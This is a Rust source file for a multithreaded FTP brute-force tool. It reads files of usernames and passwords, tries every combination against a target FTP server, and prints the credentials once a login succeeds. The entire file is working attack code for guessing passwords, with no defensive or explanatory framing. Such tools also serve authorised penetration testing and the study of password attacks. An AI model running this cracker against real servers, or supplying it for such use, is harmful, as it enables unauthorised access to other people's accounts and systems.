use anyhow::{Error, Ok};
use core::result::Result::Ok as Okb;
use rayon::prelude::*;
use std::env;
use std::fs::File;
use std::io::{BufRead, BufReader};
use std::process;
use std::str;
use suppaftp::FtpStream;

mod error;

fn main() -> Result<(), Error> {
    let args: Vec<String> = env::args().collect();
    check_arguments(&args)?;

    rayon::ThreadPoolBuilder::new()
        .num_threads(args[4].parse::<usize>().unwrap())
        .build_global()
        .unwrap();

    cracker(&args[1], &args[2], &args[3])?;
    Ok(())
}

fn check_arguments(args: &Vec<String>) -> Result<(), Error> {
    if args.len() == 5 {
        return Ok(());
    }
    Err(error::CrackerError::WrongArguments.into())
}

fn cracker(logins: &str, passwords: &str, target: &str) -> Result<(), Error> {
    let (logins, passwords) = parse_files(logins, passwords)?;
    logins.into_par_iter().for_each(|login| {
        passwords
            .clone()
            .into_par_iter()
            .for_each(|password| caller(&login, &password, target).unwrap())
    });
    Err(error::CrackerError::CredentialsNotFound.into())
}

fn caller(login: &str, password: &str, target: &str) -> Result<(), Error> {
    println!("      trying: {}:{} - {}", login, password, target);
    let mut ftp_stream = FtpStream::connect(target)?;
    match ftp_stream.login(login, password) {
        Err(_) => {}
        Okb(_) => {
            println!("found: {}:{}", login, password);
            let _ = ftp_stream.quit();
            process::exit(0x0100);
        }
    };
    Ok(())
}

fn parse_files(logins: &str, passwords: &str) -> Result<(Vec<String>, Vec<String>), Error> {
    let file_logins = File::open(logins)?;
    let reader_logins = BufReader::new(&file_logins);
    let file_passwords = File::open(&passwords)?;
    let reader_passwords = BufReader::new(&file_passwords);
    let logins: Vec<String> = reader_logins
        .lines()
        .map(|line| line.expect("Failed to read line"))
        .collect();
    let passwords: Vec<String> = reader_passwords
        .lines()
        .map(|line| line.expect("Failed to read line"))
        .collect();
    Ok((logins, passwords))
}
